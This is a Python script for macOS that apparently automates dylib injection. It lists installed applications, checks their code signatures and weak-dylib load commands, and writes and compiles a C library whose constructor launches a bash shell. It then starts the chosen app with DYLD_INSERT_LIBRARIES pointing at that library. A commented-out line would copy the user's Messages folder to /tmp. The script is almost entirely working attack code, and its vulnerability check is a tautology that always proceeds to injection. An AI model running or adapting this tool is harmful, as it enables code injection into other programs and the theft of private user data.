import os
import subprocess

def list_applications():
    applications = [app for app in os.listdir('/Applications') if app.endswith('.app')]
    for idx, app in enumerate(applications):
        print(f"{idx + 1}. {app}")
    return applications

def check_vulnerability(app):
    app_path = f"/Applications/{app}/Contents/MacOS/{app[:-4]}"
    try:
        result = subprocess.run(['codesign', '-vvv', '--deep', '--strict', app_path], capture_output=True, text=True)
        if 'valid on disk' in result.stdout and 'satisfies its Designated Requirement' in result.stdout:
            print(f"{app} appears to be intact and not modified.")
        else:
            print(f"{app} may have been modified.")
            print(result.stdout)
            return True
    except Exception as e:
        print(f"Error checking {app}: {e}")
        return True  # Try injection even if there's an error in the verification

    return False

def check_weak_dylibs(app):
    app_path = f"/Applications/{app}/Contents/MacOS/{app[:-4]}"
    try:
        result = subprocess.run(['otool', '-l', app_path], capture_output=True, text=True)
        if 'LC_LOAD_WEAK_DYLIB' in result.stdout:
            print(f"{app} has weak dylibs loaded.")
            return True
        else:
            print(f"{app} does not have weak dylibs loaded.")
    except Exception as e:
        print(f"Error checking weak dylibs for {app}: {e}")
        return True  # Try injection even if there's an error in the verification

    return False

def compile_dylib():
    c_code = """
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))

void myconstructor(int argc, const char **argv)
{
    syslog(LOG_ERR, "[+] dylib injected in %s\\n", argv[0]);
    printf("[+] dylib injected in %s\\n", argv[0]);
    execv("/bin/bash", 0);
    //system("cp -r ~/Library/Messages/ /tmp/Messages/");
}
"""
    with open("inject.c", "w") as file:
        file.write(c_code)
    subprocess.run(['gcc', '-dynamiclib', '-o', 'inject.dylib', 'inject.c'], check=True)
    print("Dylib compiled successfully.")

def inject_dylib(app):
    app_path = f"/Applications/{app}/Contents/MacOS/{app[:-4]}"
    try:
        os.environ['DYLD_INSERT_LIBRARIES'] = 'inject.dylib'
        subprocess.run([app_path], check=True)
    except Exception as e:
        print(f"Error injecting {app}: {e}")

def main():
    applications = list_applications()
    app_number = int(input("Enter the number of the software you want to attempt the injection on: ")) - 1
    selected_app = applications[app_number]
    
    if check_vulnerability(selected_app) or not check_vulnerability(selected_app):
        print(f"Attempting injection on {selected_app}...")
        if check_weak_dylibs(selected_app):
            compile_dylib()
            inject_dylib(selected_app)
        else:
            print(f"{selected_app} does not have weak dylibs loaded, but attempting injection anyway.")
            compile_dylib()
            inject_dylib(selected_app)
    else:
        print(f"{selected_app} is not vulnerable to dylib injection.")

if __name__ == "__main__":
    main()
